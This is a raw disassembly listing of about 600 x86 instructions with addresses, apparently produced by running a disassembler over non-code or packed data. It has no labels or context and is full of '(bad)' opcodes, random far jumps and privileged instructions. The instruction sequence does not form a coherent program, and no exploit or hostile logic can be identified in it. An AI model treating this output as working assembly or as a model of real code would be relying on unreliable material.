  441ea4:	push   0x73
  441ea6:	sub    al,BYTE PTR [ebp+ebp*8+0x574560b]
  441ead:	push   es
  441eae:	idiv   BYTE PTR [edi-0x8d59c0c]
  441eb4:	jmp    0xbdcfbdad
  441eb9:	and    eax,0x1dbd8be3
  441ebe:	iret   
  441ebf:	cmp    ebp,DWORD PTR [edx]
  441ec1:	into   
  441ec2:	fisttp QWORD PTR [ebx-0x742cf26b]
  441ec8:	add    cl,ah
  441eca:	push   ss
  441ecb:	jl     0x441f29
  441ecd:	add    BYTE PTR [edi-0x58eb822e],ah
  441ed3:	dec    DWORD PTR [ecx-0x1]
  441ed6:	mov    esp,0x575c7cc6
  441edb:	cmp    eax,0x2967447e
  441ee0:	jle    0x441f2c
  441ee2:	sbb    ebx,DWORD PTR [edx]
  441ee4:	mov    ah,0x7d
  441ee6:	scas   al,BYTE PTR es:[edi]
  441ee7:	stos   DWORD PTR es:[edi],eax
  441ee8:	jae    0x441f0e
  441eea:	mov    bh,0xd3
  441eec:	lock mov DWORD PTR [edi+0x41],edx
  441ef0:	dec    DWORD PTR [esi]
  441ef2:	adc    al,0x69
  441ef4:	das    
  441ef5:	inc    DWORD PTR [eax]
  441ef7:	pop    ebx
  441ef8:	aaa    
  441ef9:	mov    DWORD PTR [edi],ebx
  441efb:	inc    ecx
  441efc:	or     ecx,DWORD PTR [ebx+0x21de3277]
  441f02:	int3   
  441f03:	xabort 0x8b
  441f06:	aaa    
  441f07:	inc    ecx
  441f08:	das    
  441f09:	(bad)  
  441f0a:	aaa    
  441f0b:	inc    ecx
  441f0c:	sbb    eax,DWORD PTR [edx]
  441f0e:	dec    edx
  441f0f:	(bad)  
  441f10:	add    BYTE PTR [ecx+0x547c4581],cl
  441f16:	daa    
  441f17:	push   ds
  441f18:	jl     0x441f76
  441f1a:	push   edi
  441f1b:	sub    DWORD PTR [edx+eax*2+0x17],edi
  441f1f:	sbb    ecx,edi
  441f21:	jg     0x441f6c
  441f23:	stos   DWORD PTR es:[edi],eax
  441f24:	mov    ah,0x83
  441f26:	xchg   DWORD PTR [ecx+0x4c],eax
  441f29:	pop    esi
  441f2a:	cld    
  441f2b:	push   0x994fc3b4
  441f30:	retf   
  441f31:	int3   
  441f32:	add    BYTE PTR [ebx],cl
  441f34:	pop    ecx
  441f35:	ds add bl,bh
  441f38:	pop    eax
  441f39:	ds add bl,bh
  441f3c:	pop    eax
  441f3d:	add    BYTE PTR ds:[ebx],cl
  441f40:	pop    ecx
  441f41:	add    BYTE PTR ds:[edx+0x40],ah
  441f45:	add    eax,DWORD PTR [eax]
  441f47:	bound  eax,QWORD PTR [ecx+0x3]
  441f4a:	add    BYTE PTR [edx+0x3f],ah
  441f4d:	add    eax,DWORD PTR [eax]
  441f4f:	bound  esi,QWORD PTR [ebx]
  441f51:	add    eax,DWORD PTR [eax]
  441f53:	bound  esi,QWORD PTR [ebx]
  441f55:	add    eax,DWORD PTR [eax]
  441f57:	bound  ebx,QWORD PTR [ebx]
  441f59:	add    eax,DWORD PTR [eax]
  441f5b:	(bad)  {k7}{z}
  441f60:	mov    edi,esp
  441f62:	jmp    DWORD PTR [edx+0x3]
  441f65:	add    eax,DWORD PTR [eax]
  441f67:	bound  ebx,QWORD PTR [ebx]
  441f69:	cld    
  441f6a:	jmp    DWORD PTR [edx+0x13]
  441f6d:	(bad)  
  441f6e:	jmp    DWORD PTR [edx+0x6b]
  441f71:	or     al,BYTE PTR [eax]
  441f73:	bound  esp,QWORD PTR [ebx+0x2]
  441f76:	add    BYTE PTR [edx+0x7b],ah
  441f79:	repnz inc DWORD PTR [ebp+0x7dffd272]
  441f80:	dec    edx
  441f81:	xchg   edx,eax
  441f82:	push   DWORD PTR [ebp+0x42]
  441f85:	adc    bh,bh
  441f87:	ins    DWORD PTR es:[edi],dx
  441f88:	pop    edx
  441f89:	adc    bh,dh
  441f8b:	gs push edx
  441f8d:	adc    bh,ah
  441f8f:	pop    ebp
  441f90:	test   al,0x12
  441f92:	add    BYTE PTR [edx-0x51],ah
  441f95:	adc    cl,BYTE PTR [eax]
  441f97:	add    BYTE PTR [edx-0x49],ah
  441f9a:	adc    bl,BYTE PTR [eax]
  441f9c:	bound  edi,QWORD PTR [edi-0x789dc7ee]
  441fa2:	adc    bh,BYTE PTR [eax+0x62]
  441fa5:	(bad)  
  441fa6:	adc    bh,al
  441fa8:	bound  edx,QWORD PTR [edi-0x609c07ee]
  441fae:	adc    bh,al
  441fb0:	popa   
  441fb1:	out    0x12,eax
  441fb3:	clc    
  441fb4:	pop    ebp
  441fb5:	out    dx,eax
  441fb6:	adc    bh,al
  441fb8:	pop    ebp
  441fb9:	not    DWORD PTR [edx]
  441fbb:	clc    
  441fbc:	fstp   DWORD PTR gs:[esi]
  441fbf:	adc    bh,dl
  441fc1:	call   0xa93e31dc
  441fc6:	push   cs
  441fc7:	adc    ch,dl
  441fc9:	sub    BYTE PTR [esi+0x5d8c90b9],ch
  441fcf:	xchg   cl,cl
  441fd1:	cdq    
  441fd2:	cmc    
  441fd3:	jge    0x442026
  441fd5:	std    
  441fd6:	xchg   ecx,eax
  441fd7:	jle    0x442024
  441fd9:	lds    esp,FWORD PTR [edx-0x47]
  441fdc:	popa   
  441fdd:	push   esp
  441fde:	out    0x4,eax
  441fe0:	xchg   edx,eax
  441fe1:	pop    esp
  441fe2:	sar    ebp,cl
  441fe4:	fcomp  QWORD PTR [ebp-0x721b1ffb]
  441fea:	std    
  441feb:	neg    esi
  441fed:	mov    ch,0x5
  441fef:	mov    al,0xe6
  441ff1:	xchg   edi,eax
  441ff2:	fnstcw WORD PTR [ebx+edi*1-0x2b]
  441ff6:	add    bl,BYTE PTR [ebx]
  441ff8:	xchg   edx,eax
  441ff9:	push   es
  441ffa:	jmp    0x2e8:0x3204001c
  442001:	(bad)  
  442002:	fldl2e 
  442004:	cmp    al,0xdc
  442006:	test   ebp,eax
  442008:	iret   
  442009:	in     al,0xb5
  44200b:	mov    ebp,0xc595dcdb
  442010:	repz out 0x9f,al
  442013:	and    eax,0x6089aa7d
  442018:	enter  0xd181,0x60
  44201c:	rol    BYTE PTR [ecx+0x6203a1d5],0xd9
  442023:	jmp    0x3ad1caa4
  442028:	and    al,0xa5
  44202a:	push   edx
  44202b:	fucom  st(7)
  44202d:	in     eax,dx
  44202e:	fldl2t 
  442030:	add    esp,DWORD PTR [edx+0x54]
  442033:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442034:	stos   DWORD PTR es:[edi],eax
  442035:	cmp    DWORD PTR es:[eax],eax
  442038:	mov    eax,ds:0xe51c9c88
  44203d:	xchg   BYTE PTR [ecx-0x7dc8dd8],bl
  442043:	mov    esi,DWORD PTR [esi-0x32c3a0f3]
  442049:	adc    eax,0x11c5445f
  44204e:	pop    edi
  44204f:	dec    esp
  442050:	int    0xa9
  442052:	pop    esp
  442053:	rcl    DWORD PTR [bp-0x7f],0x34
  442058:	(bad)  
  442059:	jmp    0xcfb:0xa26224fb
  442060:	and    al,BYTE PTR [eax]
  442062:	and    BYTE PTR [ecx-0x22df95de],ch
  442068:	sub    esp,DWORD PTR [edi-0x16ff2be7]
  44206e:	popa   
  44206f:	inc    cl
  442071:	je     0x442060
  442073:	sti    
  442074:	adc    al,0xba
  442076:	std    
  442077:	pop    esp
  442078:	enter  0x21fa,0x35
  44207c:	stos   BYTE PTR es:[edi],al
  44207d:	pop    esp
  44207e:	in     eax,dx
  44207f:	sti    
  442080:	adc    al,0x70
  442082:	aad    0xfb
  442084:	or     al,0x92
  442086:	mov    DWORD PTR [eax],ebp
  442088:	mov    esi,0xd961ea
  44208d:	adc    eax,0x73c0f46e
  442092:	imul   ebx,DWORD PTR [ebx+0x65deb28b],0x8
  442099:	call   0x5d69:0x82e8dd81
  4420a0:	je     0x4420af
  4420a2:	adc    ah,BYTE PTR [esi-0x64fe56cb]
  4420a8:	add    bl,ch
  4420aa:	bound  ebx,QWORD PTR [ebp-0x77]
  4420ad:	jmp    0x442110
  4420af:	fldcw  WORD PTR [edi+0x0]
  4420b2:	xor    BYTE PTR [ebx+0x44],ch
  4420b5:	push   ecx
  4420b6:	stc    
  4420b7:	mov    dh,0x7c
  4420b9:	add    al,0x5f
  4420bb:	pop    edx
  4420bc:	xor    esp,DWORD PTR [ebx+edi*8]
  4420bf:	fisub  DWORD PTR [eax]
  4420c1:	add    dh,ah
  4420c3:	mov    dh,0x4d
  4420c5:	xor    eax,DWORD PTR [eax]
  4420c7:	cmp    ecx,DWORD PTR [esi+0x43]
  4420ca:	xor    edi,DWORD PTR [ebx]
  4420cc:	fst    DWORD PTR [esi+0x62115081]
  4420d2:	outs   dx,BYTE PTR ds:[esi]
  4420d3:	pop    esi
  4420d4:	dec    edi
  4420d5:	das    
  4420d6:	and    DWORD PTR [edx+0x78],0x4fe76573
  4420dd:	daa    
  4420de:	adc    ecx,0x72656940
  4420e4:	inc    eax
  4420e5:	pop    ds
  4420e6:	mov    eax,0xdaca
  4420eb:	les    edi,FWORD PTR [eax+0x5bc3e8b6]
  4420f1:	xlat   BYTE PTR ds:[ebx]
  4420f2:	invd   
  4420f4:	aad    0x1
  4420f6:	jne    0x4420a5
  4420f8:	iret   
  4420f9:	mov    ch,0x0
  4420fb:	jnp    0x442157
  4420fd:	div    DWORD PTR [ecx+edi*2-0x3d]
  442101:	or     eax,edi
  442103:	mov    ds,WORD PTR [edx]
  442105:	push   edi
  442106:	inc    esp
  442107:	mov    ebx,eax
  442109:	add    BYTE PTR [eax],al
  44210b:	jnp    0x4420d0
  44210d:	std    
  44210e:	(bad)  
  44210f:	jle    0x44212b
  442111:	push   edi
  442112:	inc    esp
  442113:	dec    ebx
  442114:	fild   DWORD PTR [eax]
  442116:	add    BYTE PTR [ebx+0x70],cl
  442119:	dec    esi
  44211a:	pop    ebx
  44211b:	jae    0x4420df
  44211d:	adc    BYTE PTR [eax+0x7708d2bb],0x36
  442124:	or     esi,DWORD PTR [edi-0x435d199a]
  44212a:	add    BYTE PTR [eax],0x62
  44212d:	repz in al,dx
  44212f:	int3   
  442130:	inc    edx
  442131:	cmp    ebx,DWORD PTR [ebx]
  442133:	test   BYTE PTR [esi-0x2c],dh
  442136:	jnp    0x442183
  442138:	ds sub dl,ah
  44213b:	rcr    cl,cl
  44213d:	xor    ebp,DWORD PTR [ebp+eax*4+0x16]
  442141:	fidiv  DWORD PTR [eax]
  442143:	int3   
  442144:	lfs    edi,FWORD PTR [edx+esi*2]
  442148:	pop    ebx
  442149:	icebp  
  44214a:	adc    al,0xf
  44214c:	mov    eax,0x52238708
  442151:	pop    es
  442152:	jge    0x4421b1
  442154:	data16 xor BYTE PTR [ebx],al
  442157:	aaa    
  442158:	dec    esi
  442159:	sbb    al,0xef
  44215b:	jo     0x442103
  44215d:	fsubr  DWORD PTR [edi+0x7a306203]
  442163:	iret   
  442164:	mov    ds:0xaa85f309,eax
  442169:	inc    edi
  44216a:	repz or dh,ah
  44216d:	add    eax,DWORD PTR [ebx]
  44216f:	add    BYTE PTR [edx-0x50],ah
  442172:	sbb    al,0x8
  442174:	push   ss
  442175:	aad    0xca
  442177:	(bad)  
  442178:	adc    DWORD PTR [ecx],eax
  44217a:	jns    0x442162
  44217c:	push   ecx
  44217d:	jo     0x44211c
  44217f:	stos   BYTE PTR es:[edi],al
  442180:	fdivr  DWORD PTR [edx-0x7d]
  442183:	mov    esp,0x4236352
  442188:	mov    ch,BYTE PTR [ecx+0x3063b740]
  44218e:	add    eax,DWORD PTR [eax]
  442190:	add    BYTE PTR [ecx+0x3b25bb4f],dl
  442196:	adc    BYTE PTR [eax-0x34],cl
  442199:	inc    edi
  44219a:	xor    BYTE PTR [ebx],dh
  44219c:	xchg   BYTE PTR [esi+0x497feb16],dh
  4421a2:	add    al,0x8e
  4421a4:	or     dh,BYTE PTR [ecx-0x27]
  4421a7:	sub    DWORD PTR [ebp-0x7ccdaff8],esp
  4421ad:	out    dx,al
  4421ae:	leave  
  4421af:	cmp    ah,BYTE PTR [ebx]
  4421b1:	pop    esi
  4421b2:	xor    DWORD PTR [edx-0x49],esp
  4421b5:	inc    ecx
  4421b6:	fnsave [edx-0x41]
  4421b9:	inc    ecx
  4421ba:	aad    0xa
  4421bc:	cmp    esi,esp
  4421be:	fstp   QWORD PTR [eax+0x7a]
  4421c1:	adc    eax,0xe7f3431b
  4421c6:	adc    eax,0x37262fd3
  4421cb:	jae    0x442208
  4421cd:	vpmaxub xmm0,xmm6,XMMWORD PTR [edi+0x3e9d9b7]
  4421d5:	loop   0x442211
  4421d7:	out    dx,al
  4421d8:	xchg   edi,eax
  4421d9:	inc    eax
  4421da:	fbld   TBYTE PTR [eax]
  4421dc:	xchg   edx,eax
  4421dd:	pop    esp
  4421de:	dec    edi
  4421df:	add    dl,dl
  4421e1:	add    eax,0xa67934bc
  4421e6:	pop    ecx
  4421e7:	stos   BYTE PTR es:[edi],al
  4421e8:	hlt    
  4421e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4421ea:	cmp    edx,esi
  4421ec:	sbb    esp,edi
  4421ee:	push   ss
  4421ef:	xchg   ecx,eax
  4421f0:	add    esp,DWORD PTR [edx-0x27]
  4421f3:	jmp    0x92012228
  4421f8:	adc    ebp,DWORD PTR [ebx]
  4421fa:	jbe    0x44221a
  4421fc:	call   0xdd04:0xc2148e1f
  442203:	lods   eax,DWORD PTR ds:[esi]
  442204:	std    
  442205:	(bad)  
  442207:	sbb    al,0xd2
  442209:	mov    DWORD PTR [ecx-0xf],0x575a41e2
  442210:	jne    0x442216
  442212:	(bad)  
  442213:	fldenv [edx-0x40]
  442216:	add    ecx,0x277e1572
  44221c:	push   0x1b
  44221e:	dec    esi
  44221f:	push   edx
  442220:	add    bh,ch
  442222:	leave  
  442223:	(bad)  [edx+0x4e5b6127]
  442229:	jmp    0x44220d
  44222b:	sbb    DWORD PTR [ebx],eax
  44222d:	jno    0x442256
  44222f:	and    edi,DWORD PTR [edi-0x42]
  442232:	arpl   WORD PTR [esi+0x7872eabf],sp
  442238:	mov    edi,DWORD PTR [ebp-0x26161003]
  44223e:	pop    esi
  44223f:	and    edi,esi
  442241:	push   0x58
  442243:	and    ebp,DWORD PTR [esp+ebp*2+0x29]
  442247:	mov    al,ds:0x68cdd11c
  44224c:	inc    edi
  44224d:	jb     0x442271
  44224f:	clc    
  442250:	sbb    BYTE PTR [ebx+0x5f],ah
  442253:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442254:	jmp    0x1dd7c43
  442259:	jno    0x44225b
  44225b:	lahf   
  44225c:	and    eax,0xa662a67f
  442261:	mov    edi,0xe97e72ed
  442266:	add    DWORD PTR [ecx+eiz*1-0x9],ebp
  44226a:	xchg   ecx,eax
  44226b:	mov    eax,ds:0x62ef7dd0
  442270:	fld    DWORD PTR [eax]
  442272:	xchg   ecx,eax
  442273:	pusha  
  442274:	fld    DWORD PTR [eax]
  442276:	jmp    0xa8c26cd
  44227b:	sbb    eax,0xd572c125
  442280:	test   DWORD PTR [eax],0xe9a35d62
  442286:	jae    0x4422f7
  442288:	and    edi,esi
  44228a:	push   ecx
  44228b:	mov    eax,ds:0x638b7dd0
  442290:	fld    DWORD PTR [eax]
  442292:	push   ecx
  442293:	pusha  
  442294:	fld    DWORD PTR [eax]
  442296:	jmp    0x8c252d
  44229b:	sub    BYTE PTR [esp+esi*8+0x236ad0c1],bl
  4422a2:	or     al,0xc0
  4422a4:	fidiv  DWORD PTR [esi-0x17]
  4422a7:	adc    dl,dh
  4422a9:	clc    
  4422aa:	push   DWORD PTR [eax+0x67447cde]
  4422b0:	add    eax,esi
  4422b2:	fld    st(0)
  4422b4:	dec    edx
  4422b5:	and    edi,DWORD PTR [eax]
  4422b7:	jo     0x442250
  4422b9:	or     BYTE PTR [edx+0xd83d],al
  4422bf:	add    al,bh
  4422c1:	loopne 0x442337
  4422c3:	jl     0x44231c
  4422c5:	or     eax,0x6774f7
  4422ca:	mov    dh,0x3
  4422cc:	pop    ebx
  4422cd:	mov    eax,ds:0x10632443
  4422d2:	mov    dh,0x76
  4422d4:	fild   DWORD PTR [ecx]
  4422d6:	mov    dh,0xf3
  4422d8:	daa    
  4422d9:	mov    eax,ds:0xcad92bf0
  4422de:	push   ecx
  4422df:	cmp    edi,DWORD PTR [edx+0x4c]
  4422e2:	inc    ebp
  4422e3:	sub    edi,DWORD PTR [edx-0x37]
  4422e6:	mov    ds:0xe50ab48b,eax
  4422eb:	jmp    0x442360
  4422ed:	mov    ds:0x124b2443,al
  4422f2:	mov    edi,0x6cda5f76
  4422f7:	and    al,0x77
  4422f9:	(bad)  
  4422fb:	sub    ebx,edx
  4422fd:	add    bh,BYTE PTR [edi+0xf39478b]
  442303:	cmp    edi,DWORD PTR [edx-0x35d4d6b9]
  442309:	retf   0x8ba3
  44230c:	push   edi
  44230d:	cmp    DWORD PTR [edi],ebp
  44230f:	mov    edi,DWORD PTR [edi]
  442311:	cmp    DWORD PTR [edi],esp
  442313:	cmp    esp,DWORD PTR [edx+0x71]
  442316:	xchg   edx,eax
  442317:	sbb    DWORD PTR [ecx-0x165cf08f],ecx
  44231d:	mov    ds:0xc39edd7,al
  442322:	(bad)  
  442323:	out    dx,eax
  442324:	add    BYTE PTR [ecx-0x5f],bh
  442327:	ja     0x44236c
  442329:	xchg   BYTE PTR [eax],cl
  44232b:	(bad)  
  44232c:	mov    esi,0xbed628ac
  442331:	xor    DWORD PTR [edi+esi*2-0x10],ebx
  442335:	jns    0x4423b5
  442337:	ja     0x442300
  442339:	adc    DWORD PTR [edi+esi*2+0x73],ebx
  44233d:	ds int3 
  44233f:	adc    eax,0xbe30c0d
  442344:	test   BYTE PTR ds:0x8c08923b,al
  44234a:	std    
  44234b:	ja     0x442331
  44234d:	gs dec edx
  44234f:	xlat   BYTE PTR ds:[ebx]
  442350:	and    ebx,DWORD PTR [ebp+0x43]
  442353:	push   ds
  442354:	or     BYTE PTR [esp+ebx*2-0x29],dh
  442358:	add    ebp,DWORD PTR [ebp+0x53]
  44235b:	adc    eax,0x77e8c508
  442360:	pop    ebx
  442361:	xchg   BYTE PTR [eax],ch
  442363:	push   ss
  442364:	(bad)  
  442365:	aad    0x3a
  442367:	cs mov esi,0x70e334e1
  44236d:	push   eax
  44236e:	sub    ebx,DWORD PTR [ecx-0x356da20e]
  442374:	jl     0x442312
  442376:	xor    edi,edx
  442378:	in     al,dx
  442379:	pushf  
  44237a:	scas   al,BYTE PTR es:[edi]
  44237b:	inc    eax
  44237c:	pop    ds
  44237d:	gs pop es
  44237f:	inc    edx
  442380:	or     BYTE PTR [ecx-0x7d8605f1],ch
  442386:	cmp    cl,BYTE PTR [edx+0x3be900db]
  44238c:	jle    0x442396
  44238e:	lods   al,BYTE PTR ds:[esi]
  44238f:	fsubr  DWORD PTR [ebp-0x2df00406]
  442395:	sbb    al,0xe1
  442397:	sbb    BYTE PTR [ebp*8+0x5df9321c],dl
  44239e:	mov    WORD PTR [ebp+0x575af3c5],ds
  4423a4:	aad    0x5
  4423a6:	(bad)  
  4423a7:	fnstenv [eax-0x113a7e71]
  4423ad:	dec    ebp
  4423ae:	cmp    al,0xcb
  4423b0:	jmp    0x4423b5
  4423b2:	bound  edx,QWORD PTR [ecx+edi*1+0x44]
  4423b6:	aas    
  4423b7:	retf   0xf381
  4423ba:	push   0x55
  4423bc:	dec    ecx
  4423bd:	add    esp,DWORD PTR [edx-0x27]
  4423c0:	push   0x23
  4423c2:	pop    edx
  4423c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4423c4:	int    0xfa
  4423c6:	push   ss
  4423c7:	sbb    ebx,esi
  4423c9:	cdq    
  4423ca:	and    eax,0x3e44a7d1
  4423cf:	xor    edx,ecx
  4423d1:	mul    eax
  4423d3:	pop    ecx
  4423d4:	jmp    0x39200998
  4423d9:	cli    
  4423da:	scas   al,BYTE PTR es:[edi]
  4423db:	sbb    ch,BYTE PTR [edx+0x8]
  4423de:	jne    0x442388
  4423e0:	(bad)  
  4423e2:	cmp    esp,DWORD PTR [esi]
  4423e4:	out    0x99,al
  4423e6:	mov    ebx,DWORD PTR [edi+eiz*1-0x1]
  4423ea:	push   0x2c
  4423ec:	out    0x85,eax
  4423ee:	add    BYTE PTR [eax-0x5de31107],ah
  4423f4:	push   esp
  4423f5:	xor    eax,0xb2d059e0
  4423fa:	sbb    al,0x6a
  4423fc:	lahf   
  4423fd:	sar    ecx,0x1a
  442400:	push   es
  442401:	jb     0x442403
  442403:	(bad)  
  442405:	outs   dx,DWORD PTR ds:[esi]
  442406:	cmp    dh,bl
  442408:	add    DWORD PTR [eax],eax
  44240a:	test   al,0x5f
  44240c:	shr    BYTE PTR [ebx],1
  44240e:	sar    BYTE PTR [ebx-0x4e],0xc9
  442412:	push   ecx
  442413:	jbe    0x4423e6
  442415:	jl     0x442464
  442417:	pop    esi
  442418:	fld    DWORD PTR [eax]
  44241a:	push   0xffffff86
  44241c:	shr    DWORD PTR [esi+esi*1+0x5b],1
  442420:	or     eax,0x17ebf6c1
  442425:	pop    es
  442426:	jmp    DWORD PTR [eax+0x35cae8f5]
  44242c:	pop    ebx
  44242d:	sub    cl,0xf5
  442430:	pop    ds
  442431:	add    al,BYTE PTR [eax-0x57]
  442434:	lods   al,BYTE PTR ds:[esi]
  442435:	sbb    al,0xd
  442437:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442438:	sbb    DWORD PTR [ebx],ebp
  44243a:	lods   eax,DWORD PTR ds:[esi]
  44243b:	cmp    eax,0x1b2a3bf8
  442440:	sahf   
  442441:	test   eax,0x8bd961e9
  442446:	xor    eax,DWORD PTR [edi-0x18c5d4d7]
  44244c:	add    esp,DWORD PTR ss:[ebx+0x60]
  442450:	push   ecx
  442451:	push   DWORD PTR [edx+0x0]
  442454:	and    BYTE PTR [edi],bl
  442456:	mov    DWORD PTR [edi-0x154161a1],esi
  44245c:	pop    ecx
  44245d:	cdq    
  44245e:	add    DWORD PTR [ecx+0x13],esp
  442461:	push   ds
  442462:	sub    BYTE PTR [esi],0x67
  442465:	cs pushf 
  442467:	jb     0x44245b
  442469:	sti    
  44246a:	and    al,0x62
  44246c:	or     bh,ah
  44246e:	or     BYTE PTR [eax],al
  442470:	lea    esp,[eax]
  442472:	mul    esi
  442474:	xor    al,0x97
  442476:	add    BYTE PTR [edx+0x56],ch
  442479:	pop    ds
  44247a:	ins    BYTE PTR es:[edi],dx
  44247b:	xchg   ecx,eax
  44247c:	test   al,0xa3
  44247e:	sbb    al,0x1
  442480:	repnz ins DWORD PTR es:[edi],dx
  442482:	inc    edi
  442483:	add    BYTE PTR [eax],dl
  442485:	fidivr WORD PTR [ebp+0x7]
  442488:	clc    
  442489:	ret    0x87f4
  44248c:	dec    esp
  44248d:	fmul   QWORD PTR [eax+0x40a38947]
  442493:	add    edi,eax
  442495:	cwde   
  442496:	add    esi,ebx
  442498:	adc    DWORD PTR [ebp-0x3bbcdba5],ebx
  44249e:	idiv   esi
  4424a0:	in     al,0xd1
  4424a2:	jl     0x4424a3
  4424a4:	mov    bl,0x1a
  4424a6:	or     BYTE PTR [ebp+0xdae5],al
  4424ac:	enter  0x8fa,0xf
  4424b0:	fcomp  DWORD PTR [ebx+0x357a7e08]
  4424b6:	or     eax,DWORD PTR [ebp+0x3cdabb00]
  4424bc:	add    BYTE PTR [eax],cl
  4424be:	fnstsw WORD PTR [esp+eax*1-0x80]
  4424c2:	ret    
  4424c3:	retf   
  4424c4:	(bad)  
  4424c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4424c6:	sar    DWORD PTR [edi+edi*8-0xd],1
  4424ca:	sbb    cl,BYTE PTR [eax]
  4424cc:	test   ebp,esp
  4424ce:	fiadd  DWORD PTR [eax]
  4424d0:	add    BYTE PTR [eax+0x280f08fa],cl
  4424d6:	fwait
  4424d7:	or     BYTE PTR [esi+0x3a],bh
  4424da:	xor    eax,0xda4b850b
  4424df:	cmp    al,0x0
  4424e1:	inc    eax
  4424e2:	pop    esi
  4424e3:	and    ecx,DWORD PTR [eax+edi*4]
  4424e6:	fnstsw WORD PTR [esp+eax*1+0x53]
  4424ea:	ret    
  4424eb:	push   cs
  4424ec:	push   DWORD PTR [esi+edx*8-0x1dbf0084]
  4424f3:	jl     0x442539
  4424f5:	pop    edi
  4424f6:	or     eax,esi
  4424f8:	fnstenv [eax]
  4424fa:	dec    ecx
  4424fb:	and    edi,DWORD PTR [eax]
  4424fd:	(bad)  
  4424fe:	retf   
  4424ff:	inc    ebx
  442500:	or     al,ah
  442502:	push   edx
  442503:	cld    
  442504:	jmp    DWORD PTR [edx+0x33]
  442507:	cmp    bh,BYTE PTR [esi+eax*1-0x2c]
  44250b:	int3   
  44250c:	push   esi
  44250e:	iret   
  44250f:	fstp   TBYTE PTR [esi-0x31349f9f]
  442515:	hlt    
  442516:	xchg   edi,eax
  442517:	fcmovne st,st(6)
  442519:	jno    0x4424af
  44251b:	jnp    0x44250d
  44251d:	add    BYTE PTR [ecx-0x66b6e4bd],cl
  442523:	popa   
  442524:	xchg   BYTE PTR [ebp+0x79],al
  442527:	inc    ecx
  442528:	adc    esp,DWORD PTR [ebx-0x13245927]
  44252e:	dec    ecx
  44252f:	lock jnp 0x442575
  442532:	jle    0x442594
  442534:	retf   0xb4c7
  442537:	enter  0x7403,0x7e
  44253b:	les    eax,FWORD PTR [ebx]
  44253d:	lock dec ecx
  44253f:	sbb    ebx,0x86e159c7
  442545:	and    eax,0xa313c139
  44254a:	fldenv [ebx-0x29]
  44254d:	aaa    
  44254e:	jmp    0x3973fcc6
  442553:	rol    DWORD PTR [esi+0x13e13915],0xa3
  44255a:	fld    st(6)
  44255c:	fucomi st,st(4)
  44255e:	leave  
  44255f:	pop    ds
  442560:	add    dh,al
  442562:	mov    ecx,eax
  442564:	retf   
  442565:	into   
  442566:	push   esp
  442567:	sub    dl,bl
  442569:	into   
  44256a:	rcl    DWORD PTR [ebx+0x2389f07b],1
  442570:	jp     0x442537
  442572:	mov    cl,0x93
  442574:	jnp    0x4425e9
  442576:	xchg   cl,bl
  442578:	or     eax,0xf1f5097b
  44257d:	sbb    al,0x41
  44257f:	pop    ds
  442580:	into   
  442581:	push   es
  442582:	add    ah,cl
  442584:	mov    al,ds:0x5f8dbfe9
  442589:	jecxz  0x44258e
  44258b:	(bad)  
  44258c:	(bad)  
  44258e:	xlat   BYTE PTR ds:[ebx]
  44258f:	(bad)  
  442592:	clc    
  442593:	lods   al,BYTE PTR ds:[esi]
  442594:	fsubr  st,st(1)
  442596:	add    esp,DWORD PTR [edx+0x63]
  442599:	repnz add esp,DWORD PTR [edx-0x27]
  44259d:	xchg   edx,eax
  44259e:	out    0x14,eax
  4425a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4425a1:	jmp    0xf3a77b65
  4425a6:	add    esp,DWORD PTR [edx-0x27]
  4425a9:	xchg   edx,eax
  4425aa:	repz fisub WORD PTR [ebp-0x620b2843]
  4425b1:	jmp    0xd3a75b75
  4425b6:	add    esp,DWORD PTR [edx-0x27]
  4425b9:	push   edx
  4425ba:	add    ebx,edi
  4425bc:	xchg   ebp,eax
  4425bd:	std    
  4425be:	stos   DWORD PTR es:[edi],eax
  4425bf:	loopne 0x4425d3
  4425c1:	aad    0x2
  4425c3:	fst    QWORD PTR [ecx-0x42b2850f]
  4425c9:	jo     0x4425be
  4425cb:	(bad)  
  4425cc:	fldcw  WORD PTR [edx-0x38]
  4425cf:	cmp    eax,0xf403a5b9
  4425d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4425d5:	jmp    0x442651
  4425d7:	or     BYTE PTR [ecx-0x5b],dl
  4425da:	fisttp WORD PTR [ebp+0x2d7a3250]
  4425e0:	mov    ebp,0xefd61c28
  4425e5:	sbb    BYTE PTR [eax+eax*1-0x54],al
  4425e9:	fcom   st(2)
  4425eb:	sub    al,0xdc
  4425ed:	mov    eax,ds:0xdd177ce5
  4425f2:	add    BYTE PTR [edx+0x78],ah
  4425f5:	dec    edi
  4425f6:	push   esp
  4425f7:	vpavgw ymm2,ymm7,YMMWORD PTR [ebp+ecx*1-0x4e]
  4425fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4425fe:	or     al,0x12
  442600:	jae    0x442657
  442602:	sbb    BYTE PTR [eax-0x36],ah
  442605:	clc    
  442606:	or     al,0xea
  442608:	jb     0x44265f
  44260a:	pop    eax
  44260b:	in     eax,dx
  44260c:	loop   0x442643
  44260e:	or     ebp,eax
  442610:	(bad)  
  442613:	pusha  
  442614:	mov    fs,WORD PTR [ebp+0x1]
  442617:	jmp    0x8b17ff7d
  44261c:	stos   DWORD PTR es:[edi],eax
  44261d:	popf   
  44261e:	xor    eax,0x980629
  442623:	jmp    0x442609
  442625:	rol    DWORD PTR [edi],cl
  442627:	mov    edx,0xac76d1a1
  44262c:	dec    edi
  44262d:	test   eax,0xb6b99223
  442632:	cmp    BYTE PTR [edx+0xa],ah
  442635:	clc    
  442636:	or     al,0xb2
  442638:	xchg   DWORD PTR [edx-0x6283edf6],ebp
  44263e:	ret    
  44263f:	repnz cwde 
  442641:	test   ah,bh
  442643:	inc    ecx
  442644:	sbb    ch,dh
  442646:	repz push esi
  442648:	inc    esp
  442649:	popf   
  44264a:	mov    esi,0xac8800f2
  44264f:	cld    
  442650:	jno    0x44261c
  442652:	not    DWORD PTR [eax]
  442654:	repnz ds stos BYTE PTR es:[edi],al
  442657:	add    eax,0xc39b4702
  44265c:	call   0x7044ffc1
  442661:	push   cs
  442662:	int3   
  442663:	jmp    0x442649
  442665:	mov    edx,0xe12eef24
  44266a:	sbb    BYTE PTR [ecx],al
